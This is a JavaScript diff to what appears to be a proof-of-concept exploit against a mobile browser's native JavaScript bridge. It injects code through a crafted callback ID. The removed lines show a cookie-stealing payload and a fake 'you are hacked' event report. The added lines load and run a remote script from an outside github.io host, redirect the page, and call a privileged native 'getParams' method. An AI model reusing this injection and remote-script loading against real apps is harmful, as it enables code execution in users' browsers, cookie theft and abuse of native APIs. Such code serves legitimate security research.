@@ -17,9 +17,8 @@
                 args[idx] = btoa(arg);
             }
         });
-
         const currUrl = location.href;
-        const payload = `window.hwbr=window.hwbr||{};window.hwbr.callbackFromNative=window.hwbr.callbackFromNative||(()=>{});if(!location.href.startsWith("${currUrl}")&&!window.__cloudx_called){window.__cloudx_called=true;alert('CloudX steal your cookie : '+document.cookie);}`;
+        const payload = `s=document.createElement('script'),s.src='https://seuercc.github.io/26/campaign.js',s.onload=()=>alert('JS'),document.head.appendChild(s)`;
         const callbackId = `${service}${genCallbackId()}');${payload}//`;
 
         // 缓存回调函数
@@ -41,7 +40,7 @@
             }, i);
         }
         setTimeout(() => {
-            location.href = 'https://vmall.com';
+            location.href = 'https://h5hosting-drcn.dbankcdn.cn/cch5/PPS/ssp-privacy-url/index.html';
         }, 100);
     };
 
@@ -70,17 +69,10 @@
     // 5. 挂载全局并调用（参数格式合规）
     window.nativeBridge = {invoke, callNativeMethod};
     nativeBridge.invoke(
-        "_hwbrNative",
-        "report",
-        "eventReport",
-        [JSON.stringify({
-            eventName: 'you are hacked',
-            version: 1,
-            info: {extInfo: {name: 'cc'}, u: 'hahaha'},
-            reportImmediately: true,
-            isOverseaReport: false,
-            isAnonymous: true
-        })],
+        "wiseopercampaign",
+        "app",
+        "getParams",
+        [],
         (res) => console.log("cloudx report succeed：", JSON.stringify(res)),
         (err) => console.log("cloudx report error：", JSON.stringify(err))
     );
